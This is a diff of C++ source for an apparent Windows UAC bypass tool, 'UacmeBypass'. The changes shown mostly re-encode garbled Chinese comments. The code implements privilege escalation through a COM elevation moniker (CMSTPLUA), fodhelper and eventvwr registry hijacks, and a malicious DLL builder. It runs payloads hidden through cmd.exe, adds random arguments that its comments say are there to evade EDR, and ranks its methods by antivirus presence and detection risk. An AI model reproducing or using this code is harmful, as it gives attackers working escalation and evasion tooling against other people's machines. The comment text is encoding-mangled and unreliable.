@@ -1,10 +1,10 @@
 #pragma once
 #define WIN32_LEAN_AND_MEAN
 
-// ½ûÓÃÌØ¶¨µÄÆúÓÃ¾¯¸æ
+// ç¦ç”¨ç‰¹å®šçš„å¼ƒç”¨è­¦å‘Š
 #define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
-#pragma warning(disable:4996)  // ½ûÓÃÒÑÆúÓÃº¯ÊıµÄ¾¯¸æ
+#pragma warning(disable:4996)  // ç¦ç”¨å·²å¼ƒç”¨å‡½æ•°çš„è­¦å‘Š
 
 #include <windows.h>
 #include <wintrust.h>
@@ -48,12 +48,12 @@
 
 namespace fs = std::filesystem;
 
-// º¯ÊıÉùÃ÷
+// å‡½æ•°å£°æ˜
 bool DetectSecurityProcesses();
 bool IsEnterpriseEdition();
 bool IsDomainJoined();
 
-// ===================== Ìæ»»ÒÑÆúÓÃµÄcodecvt¹¦ÄÜ =====================
+// ===================== æ›¿æ¢å·²å¼ƒç”¨çš„codecvtåŠŸèƒ½ =====================
 std::string WideToUTF8(const std::wstring& wideStr) {
     if (wideStr.empty()) return "";
 
@@ -63,7 +63,7 @@ std::string WideToUTF8(const std::wstring& wideStr) {
     std::string utf8Str(utf8Size, 0);
     WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, &utf8Str[0], utf8Size, nullptr, nullptr);
 
-    // ÒÆ³ıÄ©Î²µÄnull×Ö·û
+    // ç§»é™¤æœ«å°¾çš„nullå­—ç¬¦
     if (!utf8Str.empty() && utf8Str.back() == '\0') {
         utf8Str.pop_back();
     }
@@ -79,21 +79,21 @@ std::wstring UTF8ToWide(const std::string& utf8Str) {
     std::wstring wideStr(wideSize, 0);
     MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wideStr[0], wideSize);
 
-    // ÒÆ³ıÄ©Î²µÄnull×Ö·û
+    // ç§»é™¤æœ«å°¾çš„nullå­—ç¬¦
     if (!wideStr.empty() && wideStr.back() == L'\0') {
         wideStr.pop_back();
     }
     return wideStr;
 }
 
-// ===================== Ìæ»»ÒÑÆúÓÃµÄGetVersionExW¹¦ÄÜ =====================
+// ===================== æ›¿æ¢å·²å¼ƒç”¨çš„GetVersionExWåŠŸèƒ½ =====================
 
 bool IsWindows11OrGreater() {
     if (!IsWindows10OrGreater()) {
         return false;
     }
 
-    // ¼ì²é¹¹½¨°æ±¾ºÅ (Windows 11´Ó22000¿ªÊ¼)
+    // æ£€æŸ¥æ„å»ºç‰ˆæœ¬å· (Windows 11ä»22000å¼€å§‹)
     OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, {0}, 0, 0, 0, 0 };
     DWORDLONG conditionMask = 0;
 
@@ -104,27 +104,27 @@ bool IsWindows11OrGreater() {
 }
 
 bool CloneFileAttributes(const std::filesystem::path& sourcePath, const std::filesystem::path& targetPath) {
-    // 1. »ñÈ¡Ô´ÎÄ¼şÊôĞÔ£¨Ê±¼ä´Á + ÊôĞÔ±êÖ¾£©
+    // 1. è·å–æºæ–‡ä»¶å±æ€§ï¼ˆæ—¶é—´æˆ³ + å±æ€§æ ‡å¿—ï¼‰
     WIN32_FILE_ATTRIBUTE_DATA sourceAttrs;
     if (!GetFileAttributesExW(sourcePath.c_str(), GetFileExInfoStandard, &sourceAttrs)) {
-        return false; // Ô´ÎÄ¼şÊôĞÔ»ñÈ¡Ê§°Ü
+        return false; // æºæ–‡ä»¶å±æ€§è·å–å¤±è´¥
     }
 
-    // 2. ÉèÖÃÄ¿±êÎÄ¼şÊ±¼ä´Á
+    // 2. è®¾ç½®ç›®æ ‡æ–‡ä»¶æ—¶é—´æˆ³
     HANDLE hTarget = CreateFileW(
         targetPath.c_str(),
-        FILE_WRITE_ATTRIBUTES,       // ½öĞèĞ´ÊôĞÔÈ¨ÏŞ
-        FILE_SHARE_READ,             // ÔÊĞíÆäËû½ø³Ì¶ÁÈ¡
+        FILE_WRITE_ATTRIBUTES,       // ä»…éœ€å†™å±æ€§æƒé™
+        FILE_SHARE_READ,             // å…è®¸å…¶ä»–è¿›ç¨‹è¯»å–
         nullptr,
-        OPEN_EXISTING,               // Ä¿±êÎÄ¼ş±ØĞëÒÑ´æÔÚ
-        FILE_ATTRIBUTE_NORMAL,       // ÁÙÊ±È¡ÏûÊôĞÔ±ÜÃâ³åÍ»
+        OPEN_EXISTING,               // ç›®æ ‡æ–‡ä»¶å¿…é¡»å·²å­˜åœ¨
+        FILE_ATTRIBUTE_NORMAL,       // ä¸´æ—¶å–æ¶ˆå±æ€§é¿å…å†²çª
         nullptr
     );
     if (hTarget == INVALID_HANDLE_VALUE) {
         return false;
     }
 
-    // 3. ¸´ÖÆÊ±¼ä´Á£¨´´½¨/·ÃÎÊ/ĞŞ¸ÄÊ±¼ä£©
+    // 3. å¤åˆ¶æ—¶é—´æˆ³ï¼ˆåˆ›å»º/è®¿é—®/ä¿®æ”¹æ—¶é—´ï¼‰
     FILETIME creationTime = sourceAttrs.ftCreationTime;
     FILETIME lastAccessTime = sourceAttrs.ftLastAccessTime;
     FILETIME lastWriteTime = sourceAttrs.ftLastWriteTime;
@@ -132,9 +132,9 @@ bool CloneFileAttributes(const std::filesystem::path& sourcePath, const std::fil
         CloseHandle(hTarget);
         return false;
     }
-    CloseHandle(hTarget); // Ê±¼ä´ÁÉèÖÃÍê³Éºó¹Ø±Õ¾ä±ú
+    CloseHandle(hTarget); // æ—¶é—´æˆ³è®¾ç½®å®Œæˆåå…³é—­å¥æŸ„
 
-    // 4. ¸´ÖÆÎÄ¼şÊôĞÔ±êÖ¾£¨Òş²Ø/Ö»¶Á/ÏµÍ³µÈ£©
+    // 4. å¤åˆ¶æ–‡ä»¶å±æ€§æ ‡å¿—ï¼ˆéšè—/åªè¯»/ç³»ç»Ÿç­‰ï¼‰
     DWORD attributes = sourceAttrs.dwFileAttributes;
     if (!SetFileAttributesW(targetPath.c_str(), attributes)) {
         return false;
@@ -144,38 +144,38 @@ bool CloneFileAttributes(const std::filesystem::path& sourcePath, const std::fil
 }
 
 bool AppendFile(const fs::path& sourcePath, const fs::path& targetPath) {
-    // 1. ¼ì²éÔ´ÎÄ¼şÊÇ·ñ´æÔÚ
+    // 1. æ£€æŸ¥æºæ–‡ä»¶æ˜¯å¦å­˜åœ¨
     if (!fs::exists(sourcePath)) {
         return false;
     }
 
-    // 2. ÒÔ¶ş½øÖÆ×·¼ÓÄ£Ê½´ò¿ªÄ¿±êÎÄ¼ş
+    // 2. ä»¥äºŒè¿›åˆ¶è¿½åŠ æ¨¡å¼æ‰“å¼€ç›®æ ‡æ–‡ä»¶
     std::ofstream outFile(targetPath, std::ios::binary | std::ios::app);
     if (!outFile.is_open()) {
         return false;
     }
 
-    // 3. ÒÔ¶ş½øÖÆÄ£Ê½¶ÁÈ¡Ô´ÎÄ¼ş
+    // 3. ä»¥äºŒè¿›åˆ¶æ¨¡å¼è¯»å–æºæ–‡ä»¶
     std::ifstream inFile(sourcePath, std::ios::binary);
     if (!inFile.is_open()) {
         outFile.close();
         return false;
     }
 
-    // 4. Ê¹ÓÃ»º³åÇøÖğ¿é¸´ÖÆÄÚÈİ£¨¸ßĞ§´¦Àí´óÎÄ¼ş£©
-    std::vector<char> buffer(4096); // 4KB»º³åÇø
+    // 4. ä½¿ç”¨ç¼“å†²åŒºé€å—å¤åˆ¶å†…å®¹ï¼ˆé«˜æ•ˆå¤„ç†å¤§æ–‡ä»¶ï¼‰
+    std::vector<char> buffer(4096); // 4KBç¼“å†²åŒº
     while (inFile.read(buffer.data(), buffer.size())) {
-        outFile.write(buffer.data(), inFile.gcount()); // Ğ´ÈëÊµ¼Ê¶ÁÈ¡µÄ×Ö½ÚÊı
+        outFile.write(buffer.data(), inFile.gcount()); // å†™å…¥å®é™…è¯»å–çš„å­—èŠ‚æ•°
     }
-    outFile.write(buffer.data(), inFile.gcount()); // Ğ´Èë×îºóÒ»¿éÊı¾İ
+    outFile.write(buffer.data(), inFile.gcount()); // å†™å…¥æœ€åä¸€å—æ•°æ®
 
-    // 5. ¹Ø±ÕÎÄ¼ş¾ä±ú
+    // 5. å…³é—­æ–‡ä»¶å¥æŸ„
     inFile.close();
     outFile.close();
     return true;
 }
 
-// ===================== COMÌáÈ¨½Ó¿Ú¶¨Òå =====================
+// ===================== COMææƒæ¥å£å®šä¹‰ =====================
 typedef struct _ICMLuaUtil {
     void* lpVtbl;
 } ICMLuaUtil;
@@ -194,11 +194,11 @@ typedef struct _ICMLuaUtilVtbl {
     HRESULT(__stdcall* SetRegistryStringValue)(ICMLuaUtil*, HKEY, LPCTSTR, LPCTSTR, LPCTSTR);
 } ICMLuaUtilVtbl;
 
-// COM×é¼şCLSIDºÍIID
+// COMç»„ä»¶CLSIDå’ŒIID
 static const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7} };
 static const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C} };
 
-// ===================== UACÈÆ¹ıÀà =====================
+// ===================== UACç»•è¿‡ç±» =====================
 enum class UacMethod {
     FodHelper,
     EventViewer,
@@ -235,7 +235,7 @@ public:
     bool AutoBypass(const fs::path& payload);
     fs::path GetCurrentProcessPath();
 
-    // ĞÂÔö·½·¨£º´øÖØÊÔ»úÖÆµÄUACÈÆ¹ı
+    // æ–°å¢æ–¹æ³•ï¼šå¸¦é‡è¯•æœºåˆ¶çš„UACç»•è¿‡
     bool BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries = 3);
     bool AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod = 2);
 
@@ -243,10 +243,10 @@ private:
     bool Method_FodHelper(const fs::path& payload);
     bool Method_EventViewer(const fs::path& payload);
     bool Method_CMSTPProtocol(const fs::path& payload);
-    bool Method_ComHijack(const fs::path& payload);  // COM½Ó¿ÚÌáÈ¨·½·¨
+    bool Method_ComHijack(const fs::path& payload);  // COMæ¥å£ææƒæ–¹æ³•
 };
 
-// ===================== Àà·½·¨ÊµÏÖ =====================
+// ===================== ç±»æ–¹æ³•å®ç° =====================
 UacmeBypass::SystemInfo UacmeBypass::AnalyzeSystem() {
     SystemInfo info = {};
 
@@ -270,14 +270,14 @@ UacmeBypass::SystemInfo UacmeBypass::AnalyzeSystem() {
 UacMethod UacmeBypass::ChooseBestMethod() {
     SystemInfo sysInfo = AnalyzeSystem();
 
-    // 1. ¹¹½¨¶àÎ¬¶ÈÏµÍ³ÌØÕ÷ÏòÁ¿£¨ĞÂÔö¹Ø¼üÖ¸±ê£©
+    // 1. æ„å»ºå¤šç»´åº¦ç³»ç»Ÿç‰¹å¾å‘é‡ï¼ˆæ–°å¢å…³é”®æŒ‡æ ‡ï¼‰
     struct {
-        float osVersion;      // ÏµÍ³°æ±¾È¨ÖØ (Win11=1.0, Win10=0.8, ÆäËû=0.5)
+        float osVersion;      // ç³»ç»Ÿç‰ˆæœ¬æƒé‡ (Win11=1.0, Win10=0.8, å…¶ä»–=0.5)
         bool hasRegProtection;
-        DWORD uacLevel;       // UAC¼¶±ğ (0-4, Ô½¸ßÏŞÖÆÔ½ÑÏ)
-        bool isEnterprise;    // ÆóÒµ°æÏµÍ³
-        bool hasAVProcess;    // ´æÔÚÉ±Èí½ø³Ì
-        bool isDomainJoined;  // ÊÇ·ñ¼ÓÓò
+        DWORD uacLevel;       // UACçº§åˆ« (0-4, è¶Šé«˜é™åˆ¶è¶Šä¸¥)
+        bool isEnterprise;    // ä¼ä¸šç‰ˆç³»ç»Ÿ
+        bool hasAVProcess;    // å­˜åœ¨æ€è½¯è¿›ç¨‹
+        bool isDomainJoined;  // æ˜¯å¦åŠ åŸŸ
     } envProfile = {
         .osVersion = sysInfo.isWin11 ? 1.0f : (sysInfo.isWin10 ? 0.8f : 0.5f),
         .hasRegProtection = sysInfo.hasRegProtection,
@@ -287,16 +287,16 @@ UacMethod UacmeBypass::ChooseBestMethod() {
         .isDomainJoined = IsDomainJoined()
     };
 
-    // 2. ÎªÃ¿ÖÖ·½·¨¼ÆËã¶¯Ì¬ÊÊÓ¦·Ö£¨»ùÓÚÌØÕ÷È¨ÖØ£©
+    // 2. ä¸ºæ¯ç§æ–¹æ³•è®¡ç®—åŠ¨æ€é€‚åº”åˆ†ï¼ˆåŸºäºç‰¹å¾æƒé‡ï¼‰
     auto ScoreMethod = [&](UacMethod method) -> float {
-        // »ù´¡·Ö = ·½·¨¹ÌÓĞ³É¹¦ÂÊ * »·¾³¼æÈİĞÔ
+        // åŸºç¡€åˆ† = æ–¹æ³•å›ºæœ‰æˆåŠŸç‡ * ç¯å¢ƒå…¼å®¹æ€§
         float baseScore = 0.0f;
         switch (method) {
         case UacMethod::EventViewer:
             baseScore = (envProfile.osVersion > 0.9) ? 0.85 : 0.6;
             break;
         case UacMethod::ComHijack:
-            baseScore = 0.92; // COMÌáÈ¨ÆÕ±éÓĞĞ§
+            baseScore = 0.92; // COMææƒæ™®éæœ‰æ•ˆ
             break;
         case UacMethod::FodHelper:
             baseScore = (envProfile.osVersion > 0.7 && !envProfile.hasRegProtection) ? 0.78 : 0.4;
@@ -307,31 +307,31 @@ UacMethod UacmeBypass::ChooseBestMethod() {
         default: baseScore = 0.5;
         }
 
-        // ·çÏÕ³Í·£·Ö£¨¼ì²â¸ÅÂÊ + »·¾³Ãô¸Ğ¶È£©
+        // é£é™©æƒ©ç½šåˆ†ï¼ˆæ£€æµ‹æ¦‚ç‡ + ç¯å¢ƒæ•æ„Ÿåº¦ï¼‰
         float riskPenalty = 0.0f;
         if (envProfile.hasAVProcess) {
-            // ´æÔÚÉ±ÈíÊ±EventViewer/FodHelper¸üÒ×±»À¹½Ø
+            // å­˜åœ¨æ€è½¯æ—¶EventViewer/FodHelperæ›´æ˜“è¢«æ‹¦æˆª
             if (method == UacMethod::EventViewer || method == UacMethod::FodHelper)
                 riskPenalty += 0.3f;
         }
         if (envProfile.isDomainJoined) {
-            // Óò»·¾³ÖĞ±ÜÃâÊ¹ÓÃ¸ßÈÕÖ¾¼ÇÂ¼µÄCMSTP
+            // åŸŸç¯å¢ƒä¸­é¿å…ä½¿ç”¨é«˜æ—¥å¿—è®°å½•çš„CMSTP
             if (method == UacMethod::CMSTPProtocol)
                 riskPenalty += 0.25f;
         }
 
-        return std::clamp(baseScore - riskPenalty, 0.1f, 1.0f); // µÃ·Ö·¶Î§[0.1, 1.0]
+        return std::clamp(baseScore - riskPenalty, 0.1f, 1.0f); // å¾—åˆ†èŒƒå›´[0.1, 1.0]
         };
 
-    // 3. ±´Ò¶Ë¹ÓÅ»¯¾ö²ß£ºÆ½ºâÌ½Ë÷ÓëÀûÓÃ
-    static std::map<UacMethod, float> historicalSuccess; // ÀúÊ·³É¹¦ÂÊ»º´æ
+    // 3. è´å¶æ–¯ä¼˜åŒ–å†³ç­–ï¼šå¹³è¡¡æ¢ç´¢ä¸åˆ©ç”¨
+    static std::map<UacMethod, float> historicalSuccess; // å†å²æˆåŠŸç‡ç¼“å­˜
     if (historicalSuccess.empty()) {
-        // ³õÊ¼»¯Ä¬ÈÏÈ¨ÖØ
+        // åˆå§‹åŒ–é»˜è®¤æƒé‡
         historicalSuccess = { {UacMethod::EventViewer, 0.8}, {UacMethod::ComHijack, 0.9},
                              {UacMethod::FodHelper, 0.7}, {UacMethod::CMSTPProtocol, 0.6} };
     }
 
-    // ¼ÆËã×îÖÕºòÑ¡·Ö = µ±Ç°»·¾³·Ö * ÀúÊ·³É¹¦ÂÊ
+    // è®¡ç®—æœ€ç»ˆå€™é€‰åˆ† = å½“å‰ç¯å¢ƒåˆ† * å†å²æˆåŠŸç‡
     std::vector<std::pair<UacMethod, float>> candidates;
     for (int i = 0; i < static_cast<int>(UacMethod::Max); ++i) {
         auto method = static_cast<UacMethod>(i);
@@ -339,15 +339,15 @@ UacMethod UacmeBypass::ChooseBestMethod() {
         candidates.emplace_back(method, finalScore);
     }
 
-    // °´µÃ·Ö½µĞòÅÅĞò²¢Ñ¡Ôñ×îÓÅ·½·¨
+    // æŒ‰å¾—åˆ†é™åºæ’åºå¹¶é€‰æ‹©æœ€ä¼˜æ–¹æ³•
     std::sort(candidates.begin(), candidates.end(),
         [](auto& a, auto& b) { return a.second > b.second; });
 
-    // 10%¸ÅÂÊÌ½Ë÷´ÎÓÅ·½·¨£¨±ÜÃâÄ£Ê½¹Ì¶¨»¯£©
+    // 10%æ¦‚ç‡æ¢ç´¢æ¬¡ä¼˜æ–¹æ³•ï¼ˆé¿å…æ¨¡å¼å›ºå®šåŒ–ï¼‰
     if (rand() % 100 < 10 && candidates.size() > 1) {
-        return candidates[1].first; // Ñ¡ÔñµÚ¶şÃû
+        return candidates[1].first; // é€‰æ‹©ç¬¬äºŒå
     }
-    return candidates[0].first; // Ä¬ÈÏ·µ»Ø×îÓÅ½â
+    return candidates[0].first; // é»˜è®¤è¿”å›æœ€ä¼˜è§£
 }
 
 std::wstring UacmeBypass::GetSystemDirectory() {
@@ -530,7 +530,7 @@ bool UacmeBypass::SecureDelete(const fs::path& path) {
 bool UacmeBypass::CreateMaliciousDll(const fs::path& payloadPath, const fs::path& dllPath) {
     fs::create_directories(dllPath.parent_path());
 
-    // Ê¹ÓÃĞÂµÄWideToUTF8º¯ÊıÌæ»»ÒÑÆúÓÃµÄcodecvt
+    // ä½¿ç”¨æ–°çš„WideToUTF8å‡½æ•°æ›¿æ¢å·²å¼ƒç”¨çš„codecvt
     std::string payloadStr = WideToUTF8(payloadPath.wstring());
 
     std::string dllCode = R"(
@@ -634,24 +634,24 @@ bool UacmeBypass::BypassUac(UacMethod method, const fs::path& payload) {
     }
 }
 
-// ĞÂÔö£º´øÖØÊÔ»úÖÆµÄUACÈÆ¹ı·½·¨
+// æ–°å¢ï¼šå¸¦é‡è¯•æœºåˆ¶çš„UACç»•è¿‡æ–¹æ³•
 bool UacmeBypass::BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries) {
     for (int attempt = 1; attempt <= maxRetries; attempt++) {
-        std::wcout << L"³¢ÊÔ·½·¨ " << static_cast<int>(method) << L"£¬µÚ " << attempt << L" ´Î³¢ÊÔ..." << std::endl;
+        std::wcout << L"å°è¯•æ–¹æ³• " << static_cast<int>(method) << L"ï¼Œç¬¬ " << attempt << L" æ¬¡å°è¯•..." << std::endl;
 
         bool result = BypassUac(method, payload);
 
         if (result) {
-            std::wcout << L"·½·¨ " << static_cast<int>(method) << L" ÔÚµÚ " << attempt << L" ´Î³¢ÊÔÖĞ³É¹¦" << std::endl;
+            std::wcout << L"æ–¹æ³• " << static_cast<int>(method) << L" åœ¨ç¬¬ " << attempt << L" æ¬¡å°è¯•ä¸­æˆåŠŸ" << std::endl;
             return true;
         }
 
-        std::wcout << L"·½·¨ " << static_cast<int>(method) << L" µÚ " << attempt << L" ´Î³¢ÊÔÊ§°Ü" << std::endl;
+        std::wcout << L"æ–¹æ³• " << static_cast<int>(method) << L" ç¬¬ " << attempt << L" æ¬¡å°è¯•å¤±è´¥" << std::endl;
 
-        // Èç¹û²»ÊÇ×îºóÒ»´Î³¢ÊÔ£¬µÈ´ıÒ»¶ÎÊ±¼äÔÙÖØÊÔ
+        // å¦‚æœä¸æ˜¯æœ€åä¸€æ¬¡å°è¯•ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´å†é‡è¯•
         if (attempt < maxRetries) {
-            int delayMs = 1000 * attempt; // Ã¿´ÎÖØÊÔµÈ´ıÊ±¼äµİÔö
-            std::wcout << L"µÈ´ı " << delayMs << L" ºÁÃëºóÖØÊÔ..." << std::endl;
+            int delayMs = 1000 * attempt; // æ¯æ¬¡é‡è¯•ç­‰å¾…æ—¶é—´é€’å¢
+            std::wcout << L"ç­‰å¾… " << delayMs << L" æ¯«ç§’åé‡è¯•..." << std::endl;
             std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
         }
     }
@@ -675,20 +675,20 @@ bool UacmeBypass::AutoBypass(const fs::path& payload) {
     return false;
 }
 
-// ĞÂÔö£º´øÖØÊÔ»úÖÆµÄ×Ô¶¯ÈÆ¹ı
+// æ–°å¢ï¼šå¸¦é‡è¯•æœºåˆ¶çš„è‡ªåŠ¨ç»•è¿‡
 bool UacmeBypass::AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod) {
-    // ¸ù¾İÏµÍ³»·¾³Ñ¡Ôñ×î¼Ñ·½·¨
+    // æ ¹æ®ç³»ç»Ÿç¯å¢ƒé€‰æ‹©æœ€ä½³æ–¹æ³•
     UacMethod bestMethod = ChooseBestMethod();
-    std::wcout << L"Ñ¡ÔñµÄ×î¼Ñ·½·¨: " << static_cast<int>(bestMethod) << std::endl;
+    std::wcout << L"é€‰æ‹©çš„æœ€ä½³æ–¹æ³•: " << static_cast<int>(bestMethod) << std::endl;
 
-    // Ê×ÏÈ³¢ÊÔ×î¼Ñ·½·¨£¨´øÖØÊÔ£©
+    // é¦–å…ˆå°è¯•æœ€ä½³æ–¹æ³•ï¼ˆå¸¦é‡è¯•ï¼‰
     if (BypassUacWithRetry(bestMethod, payload, maxRetriesPerMethod)) {
         return true;
     }
 
-    std::wcout << L"×î¼Ñ·½·¨Ê§°Ü£¬³¢ÊÔËùÓĞ¿ÉÓÃ·½·¨..." << std::endl;
+    std::wcout << L"æœ€ä½³æ–¹æ³•å¤±è´¥ï¼Œå°è¯•æ‰€æœ‰å¯ç”¨æ–¹æ³•..." << std::endl;
 
-    // Èç¹û×î¼Ñ·½·¨Ê§°Ü£¬³¢ÊÔËùÓĞ·½·¨
+    // å¦‚æœæœ€ä½³æ–¹æ³•å¤±è´¥ï¼Œå°è¯•æ‰€æœ‰æ–¹æ³•
     const std::vector<UacMethod> allMethods = {
         UacMethod::ComHijack,
         UacMethod::CMSTPProtocol,
@@ -697,7 +697,7 @@ bool UacmeBypass::AutoBypassWithRetry(const fs::path& payload, int maxRetriesPer
     };
 
     for (const auto& method : allMethods) {
-        if (method == bestMethod) continue; // ÒÑ¾­³¢ÊÔ¹ı×î¼Ñ·½·¨
+        if (method == bestMethod) continue; // å·²ç»å°è¯•è¿‡æœ€ä½³æ–¹æ³•
 
         if (BypassUacWithRetry(method, payload, maxRetriesPerMethod)) {
             return true;
@@ -707,28 +707,28 @@ bool UacmeBypass::AutoBypassWithRetry(const fs::path& payload, int maxRetriesPer
     return false;
 }
 
-// ===================== COMÌáÈ¨ºËĞÄ·½·¨ =====================
+// ===================== COMææƒæ ¸å¿ƒæ–¹æ³• =====================
 bool UacmeBypass::Method_ComHijack(const fs::path& payload) {
-    // Ê¹ÓÃCOM Elevation Moniker¼¼ÊõÌáÈ¨
+    // ä½¿ç”¨COM Elevation MonikeræŠ€æœ¯ææƒ
     std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 2000));
 
-    // ¹¹ÔìÌáÉıÈ¨ÏŞÃû×Ö×Ö·û´®
+    // æ„é€ æå‡æƒé™åå­—å­—ç¬¦ä¸²
     WCHAR wszCLSID[50];
     StringFromGUID2(CLSID_CMSTPLUA, wszCLSID, ARRAYSIZE(wszCLSID));
     WCHAR monikerName[300];
     StringCchPrintf(monikerName, ARRAYSIZE(monikerName),
         L"Elevation:Administrator!new:%s", wszCLSID);
 
-    // ³õÊ¼»¯COM
+    // åˆå§‹åŒ–COM
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (FAILED(hr)) return false;
 
-    // ÉèÖÃ°ó¶¨Ñ¡Ïî
+    // è®¾ç½®ç»‘å®šé€‰é¡¹
     BIND_OPTS3 bindOpts = { sizeof(bindOpts) };
     bindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
     bindOpts.hwnd = GetDesktopWindow();
 
-    // »ñÈ¡ICMLuaUtil½Ó¿Ú
+    // è·å–ICMLuaUtilæ¥å£
     ICMLuaUtil* pCMLuaUtil = nullptr;
     hr = CoGetObject(
         monikerName,
@@ -737,53 +737,53 @@ bool UacmeBypass::Method_ComHijack(const fs::path& payload) {
         (void**)&pCMLuaUtil
     );
 
-    // Ö´ĞĞpayload
+    // æ‰§è¡Œpayload
     if (SUCCEEDED(hr) && pCMLuaUtil) {
-        // »ñÈ¡Ğéº¯Êı±í
+        // è·å–è™šå‡½æ•°è¡¨
         ICMLuaUtilVtbl* vtbl = (ICMLuaUtilVtbl*)pCMLuaUtil->lpVtbl;
 
-        // Ê¹ÓÃcmd.exe×÷ÎªÖ´ĞĞÔØÌå£¬Payload×÷Îª²ÎÊı£¨±£Áô»ìÏı£©
+        // ä½¿ç”¨cmd.exeä½œä¸ºæ‰§è¡Œè½½ä½“ï¼ŒPayloadä½œä¸ºå‚æ•°ï¼ˆä¿ç•™æ··æ·†ï¼‰
         std::wstring cmdExe = GetSystemDirectory() + L"cmd.exe";
 
-        // Ëæ»ú²ÎÊı»ìÏıEDR¼ì²â£¨±£ÁôÔ­ÓĞ»ìÏı»úÖÆ£©
+        // éšæœºå‚æ•°æ··æ·†EDRæ£€æµ‹ï¼ˆä¿ç•™åŸæœ‰æ··æ·†æœºåˆ¶ï¼‰
         std::wstring randomParam1 = L"/" + GetRandomString(4) + L"=" + GetRandomString(8);
         std::wstring randomParam2 = L"/" + GetRandomString(3) + L"=" + GetRandomString(6);
 
-        // ¹¹½¨»ìÏıµÄÃüÁîĞĞ
+        // æ„å»ºæ··æ·†çš„å‘½ä»¤è¡Œ
         std::wstring obfuscatedCmd = L"/c \"set " + GetRandomString(4) + L"= && " +
             ObfuscateCommand(payload) + L" " + randomParam1 + L" " + randomParam2 + L"\"";
 
-        // µ÷ÓÃShellExecÖ´ĞĞcmd.exe²¢´«µİ»ìÏıºóµÄPayloadÃüÁî
+        // è°ƒç”¨ShellExecæ‰§è¡Œcmd.exeå¹¶ä¼ é€’æ··æ·†åçš„Payloadå‘½ä»¤
         hr = vtbl->ShellExec(
             pCMLuaUtil,
-            cmdExe.c_str(),         // Ê¹ÓÃcmd.exe×÷Îª¿ÉÖ´ĞĞÎÄ¼ş
-            obfuscatedCmd.c_str(),  // »ìÏıºóµÄPayloadÃüÁî×÷Îª²ÎÊı
+            cmdExe.c_str(),         // ä½¿ç”¨cmd.exeä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶
+            obfuscatedCmd.c_str(),  // æ··æ·†åçš„Payloadå‘½ä»¤ä½œä¸ºå‚æ•°
             NULL,
             SEE_MASK_NO_CONSOLE,
             SW_HIDE
         );
 
-        // ÊÍ·ÅCOM¶ÔÏó
+        // é‡Šæ”¾COMå¯¹è±¡
         vtbl->Release(pCMLuaUtil);
     }
 
     CoUninitialize();
     return SUCCEEDED(hr);
 }
-// ===================== ÆäËûUACÈÆ¹ı·½·¨ =====================
+// ===================== å…¶ä»–UACç»•è¿‡æ–¹æ³• =====================
 bool UacmeBypass::Method_EventViewer(const fs::path& payload) {
     const std::wstring targetExe = GetSystemDirectory() + L"eventvwr.exe";
     if (!VerifyMicrosoftSignature(targetExe))
         return false;
 
-    // Ê¹ÓÃËæ»ú×¢²á±í¼üÃû£¨±£Áô»ìÏı£©
+    // ä½¿ç”¨éšæœºæ³¨å†Œè¡¨é”®åï¼ˆä¿ç•™æ··æ·†ï¼‰
     std::wstring randomKey = L"mscfile_" + GetRandomString(8);
     const std::wstring regPath = L"Software\\Classes\\" + randomKey + L"\\shell\\open\\command";
 
     if (IsRegistryProtected(HKEY_CURRENT_USER, regPath.substr(0, regPath.find_last_of('\\'))))
         return false;
 
-    // Ê¹ÓÃcmd.exeÖ´ĞĞPayload£¨±£Áô»ìÏı»úÖÆ£©
+    // ä½¿ç”¨cmd.exeæ‰§è¡ŒPayloadï¼ˆä¿ç•™æ··æ·†æœºåˆ¶ï¼‰
     std::wstring randomEnvVar = GetRandomString(4);
     std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
         ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";
@@ -797,7 +797,7 @@ bool UacmeBypass::Method_EventViewer(const fs::path& payload) {
         reinterpret_cast<const BYTE*>(cmd.c_str()), static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
     RegCloseKey(hKey);
 
-    // ´´½¨¿ì½İ·½Ê½Æô¶¯eventvwr£¨±£ÁôÔ­ÓĞ»úÖÆ£©
+    // åˆ›å»ºå¿«æ·æ–¹å¼å¯åŠ¨eventvwrï¼ˆä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     fs::path lnkPath = GetTempDirectory() / (GetRandomString(8) + L".lnk");
     IShellLinkW* psl;
     if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
@@ -824,27 +824,27 @@ bool UacmeBypass::Method_EventViewer(const fs::path& payload) {
     return result;
 }
 bool UacmeBypass::Method_FodHelper(const fs::path& payload) {
-    // 1. ¶¯Ì¬Éú³É¸ßÃÔ»óĞÔ×¢²á±í¼üÃû£¨Î±×°ÎªVPNÅäÖÃ£¬±£Áô»ìÏı£©
+    // 1. åŠ¨æ€ç”Ÿæˆé«˜è¿·æƒ‘æ€§æ³¨å†Œè¡¨é”®åï¼ˆä¼ªè£…ä¸ºVPNé…ç½®ï¼Œä¿ç•™æ··æ·†ï¼‰
     std::wstring randomKey = L"VPNConfig_" + GetRandomString(10);
     std::wstring fullRegPath = L"Software\\Classes\\" + randomKey + L"\\Shell\\Open\\command";
 
